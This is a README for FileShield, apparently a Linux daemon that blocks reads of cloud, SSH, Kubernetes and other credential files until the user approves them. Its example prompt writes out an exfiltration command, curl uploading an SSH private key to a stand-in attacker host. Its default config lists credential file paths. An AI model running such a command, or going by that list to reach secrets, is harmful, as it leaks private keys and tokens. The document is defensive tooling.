# FileShield

**FileShield** is a Linux security tool that intercepts and blocks file access to sensitive files (e.g., AWS secrets, SSH keys, kubeconfig) before the read completes, then prompts the user to allow or deny it. It is built on **`fanotify` permission events** — the same kernel mechanism used by Linux antivirus scanners.

> Unlike approaches based on `inotify` or `auditd` alone, FileShield uses `FAN_OPEN_PERM` events which suspend the syscall in the kernel until a decision is made. The file data is never read by the requesting process until you click Allow.

---

## Features

- **True pre-access blocking**: The kernel suspends the `open()` syscall until FileShield responds — no race condition.
- **Interactive prompts**: GUI popups (via `zenity` or `kdialog`) ask for permission before any data is exposed.
- **Per-process allowlisting with TTL**: Grant access to a process for a configurable duration without repeated prompts.
- **SRE secrets covered by default**: AWS, kubeconfig, SSH keys, GCP, Azure, Vault token, Docker config, and more — out of the box.

---

## Requirements

- Linux kernel **5.0+** (5.1+ recommended)
- `**zenity**` or `**kdialog**` (for GUI popups)

## Installation

### 1. Install Dependencies

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install zenity

# Fedora
sudo dnf install zenity

# Arch
sudo pacman -S zenity
```

### 2. Clone and Build

```bash
git clone https://github.com/yourusername/fileshield.git
cd fileshield
make
sudo make install
```

### 3. Start

```bash
sudo systemctl enable --now fileshield
```

The daemon requires root (`CAP_SYS_ADMIN`) to open a `fanotify` permission fd — this is a kernel requirement.

---

## Usage

Edit `fileshield.conf` to adjust protected paths or the allowlist, then reload:

```bash
sudo systemctl reload fileshield
# or equivalently:
sudo kill -HUP $(pidof fileshield)
```

Sending `SIGHUP` to the daemon causes it to re-read `fileshield.conf`, remove old fanotify marks, and re-register the new set. Persisted *Always Allow* / *Always Deny* lists are reloaded from disk at the same time, so `fileshield-cli` changes take effect on reload.

### Default Protected Paths

FileShield ships with the following paths protected out of the box:

```ini
[protected_paths]
# --- Cloud credentials ---
~/.aws/credentials
~/.aws/config
~/.azure/
~/.config/gcloud/

# --- Kubernetes ---
~/.kube/config
~/.kube/cache/

# --- SSH ---
~/.ssh/

# --- GPG / age / SOPS ---
~/.gnupg/
~/.config/sops/

# --- Password managers & vaults ---
~/.password-store/
~/.config/op/
~/.vault-token
~/.config/vault/

# --- Container registries ---
~/.docker/config.json
~/.config/helm/repositories.yaml

# --- Terraform ---
~/.terraform.d/credentials.tfrc.json
~/.terraformrc

# --- SCM tokens ---
~/.config/gh/hosts.yml

# --- General ---
~/.netrc
~/.env
```

### Allowlist

The `[allowlist]` section is **empty by default**. Pre-allowlisting a binary by path is risky: if that binary is replaced, wrapped, or symlinked by a compromised package, it inherits silent access to every protected resource without any popup.

Add entries only for tools you have audited and trust at that exact path:

```ini
[allowlist]
# Format: /absolute/path/to/binary = ttl_seconds
# /usr/bin/ssh       = 3600
# /usr/bin/gpg       = 3600
```

> **Why not pre-allowlist common SRE tools?**  
> A supply-chain attack that replaces `/usr/local/bin/aws` would get unconditional access to `~/.aws/credentials` forever. An empty default forces a conscious opt-in decision per binary.

### Example Workflow

When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/user/.ssh/id_rsa`:

1. The kernel suspends the `open()` call.
2. A popup appears:

   ```text
   Process curl (PID 4521, parent: bash (PID 4518)) wants to read:
   /home/user/.ssh/id_rsa

   Binary:   /tmp/curl
   Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa

   • Allow Once    — grant access this time only
   • Always Allow  — trust this exact binary (SHA-512 verified)
                   in this call chain; re-prompts if it changes
   • Deny          — block access
   ```

3. **Deny** → `FAN_DENY` — the process receives `EPERM`, the file is never read.
4. **Allow Once** → `FAN_ALLOW` — access granted, decision cached for the TTL.
5. **Always Allow** → `FAN_ALLOW` — access granted **and** a runtime allowlist entry is created (see below).

### Always Allow — runtime dynamic allowlist (persistent)

Clicking **Always Allow** stores a fingerprinted entry in the daemon's in-memory allowlist **and persists it to disk** for reuse after daemon restart or reboot:

| Attribute checked on every future match | Why |
| --- | --- |
| Binary path | Basic identity |
| **SHA-512 of the binary** | Detects on-disk replacement (supply-chain attack) |
| **Call chain** (up to 3 ancestors) | Prevents a different caller from inheriting the rule |
| **SHA-512 of each ancestor exe** | Detects replaced parent binaries |

**Example:** clicking *Always Allow* for the popup shown above records:

```text
binary:         /usr/bin/git  (sha512: a3f1…)
parent[0]:      code          (sha512: 7c82…)
parent[1]:      systemd       (sha512: 0d4e…)
```

A future `git` call from `bash` instead of `code` will prompt again because the call chain differs. A trojaned `/usr/bin/git` will also prompt again because its SHA-512 has changed.

#### Persistence

*Always Allow* entries are stored in a JSON state file (`/var/lib/fileshield/runtime-allowlist.json`) with strict permissions (mode 0600, root-only). The entries are:

- **Automatically loaded** when the daemon starts (on reboot, after systemctl restart, etc.)
- **Immediately saved** when you click "Always Allow" (no manual action needed)
- **Fail-secure**: if the state file is corrupted or unreadable, the daemon starts with an empty allowlist and reprompts

To clear all persisted entries:

```bash
sudo rm /var/lib/fileshield/runtime-allowlist.json
sudo systemctl restart fileshield
```

To view the current persisted entries:

```bash
cat /var/lib/fileshield/runtime-allowlist.json | jq .
```

---

1. The daemon calls `fanotify_init(FAN_CLASS_CONTENT, O_RDONLY | O_LARGEFILE)`.
2. It registers `FAN_OPEN_PERM` marks on each protected path via `fanotify_mark()`.
3. When a process opens a watched file, the kernel delivers a `fanotify_event_metadata` event and **blocks the calling process**.
4. The daemon resolves the binary path via `/proc/<pid>/exe` and checks the allowlist cache.
5. On a cache miss, it spawns a `zenity` popup and waits for user input.
6. It writes a `struct fanotify_response` with `FAN_ALLOW` or `FAN_DENY` back to the fanotify fd.
7. The kernel unblocks the original syscall with the appropriate result.

---

## Limitations

- **Root processes**: A process running as root can bypass fanotify. FileShield protects against unprivileged or compromised user-space processes.
- **GUI dependency**: Requires a desktop session for popups.
- **Kernel version**: `fanotify` permission events on directories require kernel 5.0+.
- **Networked filesystems**: `fanotify` marks do not propagate to NFS/CIFS mounts.
- **Bind mounts and `mmap`**: `fanotify` only reports events on the mount the mark was placed on, and does not report `mmap(2)` accesses. Bind-mount aliases of protected paths, or a process that already holds an open descriptor, are outside the threat model.
- **Hard links and symlinks**: Protected paths are canonicalized at load time (so a symlinked `~/.ssh` is still matched), and files created or moved into a protected tree are tracked by inode. Access through a hard link outside the watched directories is detected and prompts; this is best-effort for files that never appeared under a protected path.
- **TOCTOU on binary identity**: The daemon resolves the calling process's binary via `/proc/<pid>/exe` while the process is kernel-suspended. The process cannot `execve()` at that moment, but its binary on disk could theoretically be replaced between the `readlink()` and the allowlist/cache check. This is an inherent limitation of all fanotify-based permission systems and is considered low-risk in practice.
- **Dialog rate limiting**: To bound prompt-flooding (e.g. a process that re-execs itself repeatedly), a binary path is denied without prompting after 20 prompts within 60 seconds, for a 30-second cooldown.

## Logs

FileShield writes all events to the system journal via `syslog(3)` under the `LOG_DAEMON` facility and the identifier `fileshield`.

### Follow live events

```bash
# systemd journal (recommended)
journalctl -u fileshield -f

# or filter by syslog identifier across all units
journalctl -t fileshield -f
```

### Query past events

```bash
# Everything since last boot
journalctl -u fileshield -b

# Last 100 lines
journalctl -u fileshield -n 100

# Only errors and above
journalctl -u fileshield -p err

# Between two timestamps
journalctl -u fileshield --since "2026-05-26 09:00" --until "2026-05-26 10:00"
```

### Log verbosity

The daemon logs at the following levels:

| Level | Events |
| ------- | -------- |
| `INFO` | Start/stop, config load, fanotify marks added/removed, reload |
| `WARNING` | Failed marks (path not found), popup tool fallback |
| `ERR` | `fanotify_init` failure, config parse error, fork/exec failure |

---

## Running in Foreground (Debug Mode)

To see all log output directly in the terminal without systemd, stop the service and run the daemon in the foreground:

```bash
sudo systemctl stop fileshield
sudo ./build/fileshield --foreground --config fileshield.conf
```

All `syslog` messages are mirrored to `stderr`. Combine with `strace` for deep inspection:

```bash
sudo strace -e trace=fanotify_init,fanotify_mark,read,write \
    ./build/fileshield --foreground --config fileshield.conf
```

### AddressSanitizer / UBSan build

```bash
make debug
sudo ./build/fileshield --foreground --config fileshield.conf
```

This builds with `-O0 -g -fsanitize=address,undefined` and prints any memory errors or undefined behaviour to stderr immediately.

---

## Running Tests

Unit tests cover the cache, config parser, and utility functions. They require no root and no kernel fanotify support.

```bash
# Build and run all tests
make test

# Build tests without running
make build/test_cache build/test_config build/test_utils

# Run a single test binary directly
./build/test_cache
./build/test_config
./build/test_utils
```

A passing run prints `PASS` for each suite; failures print the failing assertion and exit non-zero.

### Static analysis

```bash
make lint
```

Runs `cppcheck` over all sources in `src/` and `tests/`. Requires `cppcheck` to be installed (`apt install cppcheck` / `dnf install cppcheck`).

---

## Troubleshooting

- **No popups appear?** The daemon auto-detects the Wayland socket and D-Bus address under `/run/user/<uid>/`. Verify the desktop session is active and `kdialog` (KDE) or `zenity` (GNOME) is installed.
- **Access blocked for a trusted process?** Add it to `[allowlist]` in `/etc/fileshield.conf` and run `sudo systemctl reload fileshield`. Check `journalctl -u fileshield -n 20` to confirm the reload succeeded.
- **Daemon fails to start?** Confirm the service runs as root — `fanotify_init` requires `CAP_SYS_ADMIN`. Check `journalctl -u fileshield -p err` for the exact error.
- **A path is watched but events are not firing?** Verify the mark was added successfully (`journalctl -t fileshield | grep "mark added"`). Paths on NFS/CIFS mounts or inside containers are not supported by fanotify.
- **All accesses denied with no popup on a headless machine?** FileShield requires a live desktop session to display dialogs. On headless hosts the daemon will deny all unknown accesses (fail-closed). Run in foreground mode and inspect the stderr output to confirm.
